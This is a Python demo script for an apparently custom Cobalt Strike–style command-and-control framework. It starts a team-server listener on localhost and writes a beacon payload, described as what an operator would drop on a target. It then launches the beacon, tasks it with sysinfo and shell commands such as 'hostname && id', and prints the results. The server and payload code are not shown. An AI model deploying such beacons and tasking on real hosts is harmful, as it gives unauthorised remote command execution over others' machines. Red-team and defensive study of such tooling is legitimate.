#!/usr/bin/env python3
"""Full live demo: server + real beacon subprocess + tasking thread."""
import os, sys, time, threading, subprocess, hashlib
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cs.server import TeamServer
import shutil

DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data_live")
shutil.rmtree(DATA, ignore_errors=True)

srv = TeamServer(data_dir=DATA)
port = 19222
lis, err = srv.start_listener("demo", "127.0.0.1", port)
assert not err, err
print("[+] listener:", lis.url)

# Generate an embeddable payload that a remote host would run
from cs.payload import write_payload
payload_path = os.path.join(DATA, "beacon_payload.py")
write_payload(f"http://127.0.0.1:{port}", payload_path, interval=2, jitter=0.1)
print("[+] payload written:", payload_path)

# Launch a real beacon subprocess (what an operator would drop on a target)
beacon_name = hashlib.sha1(b"live-demo").hexdigest()[:16]
proc = subprocess.Popen([sys.executable, payload_path, "--name", beacon_name],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
print(f"[+] launched beacon subprocess pid={proc.pid}")

# Wait for beacon to register and poll in
deadline = time.time() + 15
while time.time() < deadline:
    sess = srv.store.all()
    if sess:
        break
    time.sleep(0.3)
if not sess:
    print("[!] beacon never checked in")
    proc.kill(); sys.exit(1)

sid = sess[0]["id"]
print(f"[+] beacon registered: {sid} ({sess[0]['hostname']})")
time.sleep(1)

# Task hostname, sysinfo, and a shell command
for t in ["sysinfo", "shell hostname && id", "ls /tmp "[:0] + "pwd"]:
    tid, info = srv.task(sid, t)
    print(f"[+] queued {tid}: {t}")
    time.sleep(3.5)  # allow beacon to poll+execute

time.sleep(3)
final = srv.store.get(sid)
print("\n=== results ===")
for r in final["results"]:
    print("---")
    print(r["data"][:200])

proc.terminate()
try:
    proc.wait(timeout=3)
except Exception:
    proc.kill()
srv.stop_listener("demo")
print("\n[PASS] live demo complete")
